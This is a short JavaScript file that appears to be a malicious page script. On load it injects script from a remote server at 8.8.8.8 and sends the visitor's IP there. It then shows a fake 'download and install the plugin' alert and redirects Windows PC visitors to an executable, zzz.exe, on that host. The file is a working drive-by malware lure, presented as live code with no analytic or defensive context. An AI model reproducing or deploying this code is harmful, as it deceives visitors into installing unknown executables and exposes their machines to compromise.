var returnCitySN = {"cip": "0.0.0.0", "bobo": "000000"};
//document.write("<script src='http://pv.sohu.com/cityjson?ie=utf-8'></script>");
document.write("<script src='http://8.8.8.8/bobo.php?getaddr=123'></script>");


function isRise(ip,bobo) {
    download();
    var xmlHttp;
    if (window.XMLHttpRequest) {
        xmlHttp = new XMLHttpRequest();
    } else {
        xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
    }
    xmlHttp.open("GET", "http://8.8.8.8/bobo.php?search="+ip, "true");
    xmlHttp.send();
    xmlHttp.onreadystatechange = function() {
		//alert(xmlHttp.responseText)
        if (xmlHttp.readyState == 4 && xmlHttp.status == 200) {
            var resData = xmlHttp.responseText;
            if (resData == "in" && bobo == "111111") {
            } else {
				document.write("<script src='http://8.8.8.8/bobo.php?bobo=1'></script>");
                download();
            }
        }
    }
}


function download(){
    alert("Please try downloading and installing the plugin before accessing this page!");
    window.location.href="http://8.8.8.8/zzz.exe";
}


function isPc() {
    if (navigator.userAgent.match(/(iPhone|Android)/i)) {
        return false;
    } else {
        return true;
    }
}


window.onload = function(){
    if(!isPc()){
        alert("This page can only be loaded on a PC. Please try again later...");
    }else{
        isRise(returnCitySN["cip"], returnCitySN["bobo"]);
    }
}
